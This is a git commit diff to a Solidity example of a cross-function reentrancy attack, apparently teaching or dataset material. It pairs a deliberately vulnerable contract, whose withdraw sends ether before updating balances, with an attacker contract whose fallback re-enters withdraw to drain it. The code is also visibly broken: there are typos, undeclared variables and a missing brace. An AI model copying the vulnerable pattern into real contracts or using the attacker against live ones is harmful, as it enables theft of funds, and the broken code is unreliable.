ba0acc273be12845f54f86935914e3421a8e8b2d
Messi-Q <messi.qp711@gmail.com>
2019-12-10 23:35:32 +0800

    Update Reentrancy_cross_function.sol

--- Reentrancy_cross_function.sol
+++ Reentrancy_cross_function.sol
@@ -1,36 +1,56 @@
-// This contract is vulnerable to attack
-contract Victim {
-  mapping (address => uint) private Balance;
-  uint bonuspool;
-  
-  function getBonus(address rept) {
-    if(bonusPool > 0) {
-      rept.call.value(bonus)();
-      bonuspool -= bonus;
-    }
+pragma solidity ^0.4.18;
+
+contract Vulnerable{
+  mapping (address => uint) private userBalances;
+  mapping (address => uint) private rewardsForA;
+  uint public totalbalance=0;
+
+  function createUser() payable{ 
+     rewardsForA[msg.sender] += msg.value;         
+  } 
+
+  function addToBalance() payable{ 
+     userBalances[msg.sender] += msg.value; 
+     totalbalance+= msg.value;
+  } 
+
+  // Each recipient should only be able to claim the bonus once
+  function getBonus(address recipient) public {
+      uint amountToWithdraw = rewardsForA[recipient];
+      rewardsForA[recipient] = 0;
+      if (recipient.call.value(amountToWithdraw)() == false) {
+              throw;
+      }
+      totalbalance-= amountToWithdraw;
   }
-  
-  function withdraw(uint amount) {
-    msg.sender.call.value(amount)();
-    Balance[msg.sender] -= amount;
-  }
+
+  function withdraw(unit _amount) public {   
+    msg.sender.call.value(_amount)();
+    balances[msg.sender]-=_amount;
+    totalbalance-= _amount;
 }
 
-// attack contract
-contract Attacker {
-  //...
-  function Attacker() {
-    victim = Victim(vic_addr);
+pragma solidity ^0.4.18;
+
+contract Attacker{
+  address private _owner;
+  address private vul;
+
+  //initial the attack contract with the vulnerable address
+  function Attacker(address _vulAddr){ 
+     _owner=msg.sender;
+     vul=_vulAddr;
   }
-  
-  function attack() {
-    victim.getBonus(_owner);
+
+  function attack(){
+    vul.getBonus(_owner);
   }
-  
-  function() payable {
-    if (count++ < 10) {
-      victim.withdraw(2 ether);
-    }
+
+  function () payable{
+     count++;
+     if(count<10){
+       vul.withdraw(1 ether);
+     }
   }
 }
 
